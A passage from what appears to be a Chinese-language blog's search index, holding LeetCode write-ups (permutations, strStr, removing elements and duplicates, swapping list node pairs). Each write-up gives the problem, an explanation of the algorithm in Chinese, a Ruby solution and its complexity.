title="算法"></a>算法</h3><p>递归的思路：</p><ul><li>先往临时数组里放一个元素，并标记已使用过；</li><li>从数组头开始取，跳过已使用的元素；</li><li>当临时数组的长度和数组长度相等时，就遍历出一种结果；</li><li>数组的元素都遍历过后，所有答案就都有了。</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permute</span><span class="params">(nums)</span></span></span><br><span class="line">  used = Array.new(nums.length, <span class="literal">false</span>)</span><br><span class="line">  tmp, result = [], []</span><br><span class="line">  _permute(nums, tmp, used, result)</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _permute<span class="params">(nums, tmp, used, result)</span></span></span><br><span class="line">  <span class="keyword">if</span> tmp.length == nums.length</span><br><span class="line">    new_tmp = tmp.dup</span><br><span class="line">    result.push new_tmp</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    nums.length.times <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">      <span class="keyword">next</span> <span class="keyword">if</span> used[i]</span><br><span class="line">      used[i] = <span class="literal">true</span></span><br><span class="line">      tmp.push nums[i]</span><br><span class="line">      _permute(nums, tmp, used, result)</span><br><span class="line">      tmp.pop</span><br><span class="line">      used[i] = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(N!)</code></li><li>空间复杂度：<code>O(N!)</code></li></ul><h2 id="47-Permutations-II"><a href="#47-Permutations-II" class="headerlink" title="47. Permutations II"></a>47. Permutations II</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>Given a collection of numbers that might contain duplicates, return all possible unique permutations.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,1,2]</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [1,1,2],</span><br><span class="line">  [1,2,1],</span><br><span class="line">  [2,1,1]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h3><p>先排序，因为有重复数字，再遍历下一个数字是先判断是否和当前数字相同，如果相同就直接跳过。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permute_unique</span><span class="params">(nums)</span></span></span><br><span class="line">  nums.sort!</span><br><span class="line">  used = Array.new(nums.length, <span class="literal">false</span>)</span><br><span class="line">  tmp, result = [], []</span><br><span class="line">  _permute(nums, tmp, used, result)</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _permute<span class="params">(nums, tmp, used, result)</span></span></span><br><span class="line">  <span class="keyword">if</span> tmp.length == nums.length</span><br><span class="line">    new_tmp = tmp.dup</span><br><span class="line">    result.push new_tmp</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; nums.length</span><br><span class="line">      <span class="keyword">if</span> used[i]</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">next</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      used[i] = <span class="literal">true</span></span><br><span class="line">      tmp.push nums[i]</span><br><span class="line">      _permute(nums, tmp, used, result)</span><br><span class="line">      tmp.pop</span><br><span class="line">      used[i] = <span class="literal">false</span></span><br><span class="line">      <span class="keyword">while</span> i &lt; nums.length - <span class="number">1</span> <span class="keyword">and</span> nums[i] == nums[i + <span class="number">1</span>]</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-2"><a href="#复杂度-2" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(N!)</code></li><li>空间复杂度：<code>O(N!)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Implement strStr()</title>
      <link href="/2018/03/14/Implement-strStr/"/>
      <url>/2018/03/14/Implement-strStr/</url>
      <content type="html"><![CDATA[<h1 id="28-Implement-strStr"><a href="#28-Implement-strStr" class="headerlink" title="28. Implement strStr()"></a>28. Implement strStr()</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Implement strStr().</p><p>Return the index of the first occurrence of needle in haystack, or -1 if needle is not part of haystack.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: haystack = &quot;hello&quot;, needle = &quot;ll&quot;</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: haystack = &quot;aaaaa&quot;, needle = &quot;bba&quot;</span><br><span class="line">Output: -1</span><br></pre></td></tr></table></figure></p><p>Clarification:<br>What should we return when needle is an empty string? This is a great question to ask during an interview.</p><p>For the purpose of this problem, we will return 0 when needle is an empty string. This is consistent to C’s strstr() and Java’s indexOf().</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>思路很简单，从长串的头开始取子串长度的字符串，和子串比较，如果一样返回索引。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; haystack</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; needle</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_str</span><span class="params">(haystack, needle)</span></span></span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span> <span class="keyword">if</span> haystack.<span class="literal">nil</span>? <span class="keyword">or</span> needle.<span class="literal">nil</span>? <span class="keyword">or</span> haystack.length &lt; needle.length</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> needle.length == <span class="number">0</span></span><br><span class="line">  i = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> i + needle.length &lt;= haystack.length</span><br><span class="line">    <span class="keyword">return</span> i <span class="keyword">if</span> needle == haystack[i..(i - <span class="number">1</span> + needle.length)]</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(N)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Remove Element</title>
      <link href="/2018/03/13/Remove-Element/"/>
      <url>/2018/03/13/Remove-Element/</url>
      <content type="html"><![CDATA[<h1 id="27-Remove-Element"><a href="#27-Remove-Element" class="headerlink" title="27. Remove Element"></a>27. Remove Element</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given an array nums and a value val, remove all instances of that value in-place and return the new length.</p><p>Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory.</p><p>The order of elements can be changed. It doesn’t matter what you leave beyond the new length.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [3,2,2,3], val = 3,</span><br><span class="line"></span><br><span class="line">Your function should return length = 2, with the first two elements of nums being 2.</span><br><span class="line"></span><br><span class="line">It doesn&apos;t matter what you leave beyond the returned length.</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [0,1,2,2,3,0,4,2], val = 2,</span><br><span class="line"></span><br><span class="line">Your function should return length = 5, with the first five elements of nums containing 0, 1, 3, 0, and 4.</span><br><span class="line"></span><br><span class="line">Note that the order of those five elements can be arbitrary.</span><br><span class="line"></span><br><span class="line">It doesn&apos;t matter what values are set beyond the returned length.</span><br></pre></td></tr></table></figure></p><p>Clarification:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Confused why the returned value is an integer but your answer is an array?</span><br><span class="line"></span><br><span class="line">Note that the input array is passed in by reference, which means modification to the input array will be known to the caller as well.</span><br><span class="line"></span><br><span class="line">Internally you can think of this:</span><br><span class="line"></span><br><span class="line">// nums is passed in by reference. (i.e., without making a copy)</span><br><span class="line">int len = removeElement(nums, val);</span><br><span class="line"></span><br><span class="line">// any modification to nums in your function would be known by the caller.</span><br><span class="line">// using the length returned by your function, it prints the first len elements.</span><br><span class="line">for (int i = 0; i &lt; len; i++) &#123;</span><br><span class="line">    print(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>这题还是用双指针，下面用例子来解释：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1 2 3 4 5</span><br><span class="line">ij</span><br><span class="line"></span><br><span class="line">1 2 3 4 5</span><br><span class="line">  ij</span><br><span class="line"></span><br><span class="line">1 3 3 4 5</span><br><span class="line">  i j</span><br><span class="line"></span><br><span class="line">1 3 4 4 5</span><br><span class="line">    i j</span><br><span class="line"></span><br><span class="line">1 3 4 5 5</span><br><span class="line">      i j</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; val</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_element</span><span class="params">(nums, val)</span></span></span><br><span class="line">  i, j = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> j &lt; nums.length</span><br><span class="line">    <span class="keyword">if</span> nums[j] != val</span><br><span class="line">      nums[i] = nums[j]</span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(N)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Remove Duplicates from Sorted Array</title>
      <link href="/2018/03/12/Remove-Duplicates-from-Sorted-Array/"/>
      <url>/2018/03/12/Remove-Duplicates-from-Sorted-Array/</url>
      <content type="html"><![CDATA[<h1 id="Remove-Duplicates-from-Sorted-Array"><a href="#Remove-Duplicates-from-Sorted-Array" class="headerlink" title="Remove Duplicates from Sorted Array"></a>Remove Duplicates from Sorted Array</h1><h2 id="26-Remove-Duplicates-from-Sorted-Array"><a href="#26-Remove-Duplicates-from-Sorted-Array" class="headerlink" title="26. Remove Duplicates from Sorted Array"></a>26. Remove Duplicates from Sorted Array</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given a sorted array nums, remove the duplicates in-place such that each element appear only once and return the new length.</p><p>Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [1,1,2],</span><br><span class="line">Your function should return length = 2, with the first two elements of nums being 1 and 2 respectively.</span><br><span class="line">It doesn&apos;t matter what you leave beyond the returned length.</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [0,0,1,1,1,2,2,3,3,4],</span><br><span class="line">Your function should return length = 5, with the first five elements of nums being modified to 0, 1, 2, 3, and 4 respectively.</span><br><span class="line">It doesn&apos;t matter what values are set beyond the returned length.</span><br></pre></td></tr></table></figure></p><p>Clarification:</p><p>Confused why the returned value is an integer but your answer is an array?</p><p>Note that the input array is passed in by reference, which means modification to the input array will be known to the caller as well.</p><p>Internally you can think of this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// nums is passed in by reference. (i.e., without making a copy)</span><br><span class="line">int len = removeDuplicates(nums);</span><br><span class="line"></span><br><span class="line">// any modification to nums in your function would be known by the caller.</span><br><span class="line">// using the length returned by your function, it prints the first len elements.</span><br><span class="line">for (int i = 0; i &lt; len; i++) &#123;</span><br><span class="line">    print(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>用两个指针把指针之间相同元素给去掉。示例过程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1 2 2 2 3 4 4 5</span><br><span class="line">i j</span><br><span class="line"></span><br><span class="line">1 2 2 2 3 4 4 5</span><br><span class="line">  i j</span><br><span class="line"></span><br><span class="line">1 2 2 2 3 4 4 5</span><br><span class="line">  i   j</span><br><span class="line"></span><br><span class="line">1 2 2 2 3 4 4 5</span><br><span class="line">  i     j</span><br><span class="line"></span><br><span class="line">1 2 3 2 3 4 4 5</span><br><span class="line">    i     j</span><br><span class="line"></span><br><span class="line">1 2 3 4 3 4 4 5</span><br><span class="line">      i     j</span><br><span class="line"></span><br><span class="line">1 2 3 4 5 4 4 5</span><br><span class="line">        i     j</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_duplicates</span><span class="params">(nums)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> nums.length == <span class="number">0</span></span><br><span class="line">  i, j = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> j &lt; nums.length</span><br><span class="line">    <span class="keyword">if</span> nums[j] != nums[i]</span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">      nums[i] = nums[j]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> i + <span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(N)</code></li><li>空间复杂度：<code>O(1)</code></li></ul><h2 id="80-Remove-Duplicates-from-Sorted-Array-II"><a href="#80-Remove-Duplicates-from-Sorted-Array-II" class="headerlink" title="80. Remove Duplicates from Sorted Array II"></a>80. Remove Duplicates from Sorted Array II</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given a sorted array nums, remove the duplicates in-place such that duplicates appeared at most twice and return the new length.</p><p>Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [1,1,1,2,2,3],</span><br><span class="line"></span><br><span class="line">Your function should return length = 5, with the first five elements of nums being 1, 1, 2, 2 and 3 respectively.</span><br><span class="line"></span><br><span class="line">It doesn&apos;t matter what you leave beyond the returned length.</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [0,0,1,1,1,1,2,3,3],</span><br><span class="line"></span><br><span class="line">Your function should return length = 7, with the first seven elements of nums being modified to 0, 0, 1, 1, 2, 3 and 3 respectively.</span><br><span class="line"></span><br><span class="line">It doesn&apos;t matter what values are set beyond the returned length.</span><br></pre></td></tr></table></figure></p><p>Clarification:</p><p>Confused why the returned value is an integer but your answer is an array?</p><p>Note that the input array is passed in by reference, which means modification to the input array will be known to the caller as well.</p><p>Internally you can think of this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// nums is passed in by reference. (i.e., without making a copy)</span><br><span class="line">int len = removeDuplicates(nums);</span><br><span class="line"></span><br><span class="line">// any modification to nums in your function would be known by the caller.</span><br><span class="line">// using the length returned by your function, it prints the first len elements.</span><br><span class="line">for (int i = 0; i &lt; len; i++) &#123;</span><br><span class="line">    print(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>使用双指针，一个指向当前元素，一个指向前一个元素。判断两种情况：</p><ul><li>当前元素和前两个元素都相等时，指针后移跳过此元素；</li><li>其他情况，前指针后移，将当前指针元素复制给前指针，当前指针后移。</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_duplicates</span><span class="params">(nums)</span></span></span><br><span class="line">  <span class="keyword">return</span> nums.length <span class="keyword">if</span> nums.length &lt;= <span class="number">2</span></span><br><span class="line">  previous, current = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">  <span class="keyword">while</span> current &lt; nums.length</span><br><span class="line">    <span class="keyword">if</span> nums[current] == nums[previous] <span class="keyword">and</span> nums[current] == nums[previous - <span class="number">1</span>]</span><br><span class="line">      current += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      previous += <span class="number">1</span></span><br><span class="line">      nums[previous] = nums[current]</span><br><span class="line">      current += <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> previous + <span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Swap Nodes in Pairs</title>
      <link href="/2018/03/11/Swap-Nodes-in-Pairs/"/>
      <url>/2018/03/11/Swap-Nodes-in-Pairs/</url>
      <content type="html"><![CDATA[<h1 id="24-Swap-Nodes-in-Pairs"><a href="#24-Swap-Nodes-in-Pairs" class="headerlink" title="24. Swap Nodes in Pairs"></a>24. Swap Nodes in Pairs</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a linked list, swap every two adjacent nodes and return its head.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Given 1-&gt;2-&gt;3-&gt;4, you should return the list as 2-&gt;1-&gt;4-&gt;3.</span><br></pre></td></tr></table></figure></p><p>Note:</p><ul><li>Your algorithm should use only constant extra space.</li><li>You may not modify the values in the list’s nodes, only nodes itself may be changed.</li></ul><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>这题主要思路就是用三个指针来交换节点。先创建一个假节点，用它指向head。三个指针的初始状态为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dummy -&gt; head   -&gt; head.next -&gt; head.next.next</span><br><span class="line">first -&gt; second -&gt; third     -&gt; forth</span><br></pre></td></tr></table></figure></p><p>经过置换就变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">first -&gt; third -&gt; second -&gt; forth</span><br></pre></td></tr></table></figure></p><p>然后，三个指针往下移动：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">first -&gt; third -&gt; second -&gt; forth</span><br><span class="line">                  first  -&gt; second -&gt; third</span><br></pre></td></tr></table></figure></p><p>就这样直到链表被遍历完。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :next</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@next</span> = nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;ListNode&#125; head</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;ListNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap_pairs</span><span class="params">(head)</span></span></span><br><span class="line">  <span class="keyword">return</span> head <span class="keyword">if</span> head.<span class="literal">nil</span>? <span class="keyword">or</span> head.<span class="keyword">next</span>.<span class="literal">nil</span>?</span><br><span class="line">  dummy = ListNode.new(<span class="number">0</span>)</span><br><span class="line">  first, second, third = dummy, head, head.<span class="keyword">next</span></span><br><span class="line">  <span class="keyword">while</span> third</span><br><span class="line">    second.<span class="keyword">next</span> = third.<span class="keyword">next</span></span><br><span class="line">    third.<span class="keyword">next</span> = second</span><br><span class="line">    first.<span class="keyword">next</span> = third</span><br><span class="line">    </span><br><span class="line">    first = second</span><br><span class="line">    <span class="keyword">break</span> <span class="keyword">if</span> second.<span class="literal">nil</span>?</span><br><span class="line">    second = second.<span class="keyword">next</span></span><br><span class="line">    <span class="keyword">break</span> <span class="keyword">if</span> second.<span class="literal">nil</span>?</span><br><span class="line">    third = second.<span class="keyword">next</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> dummy.<span class="keyword">next</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(N)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
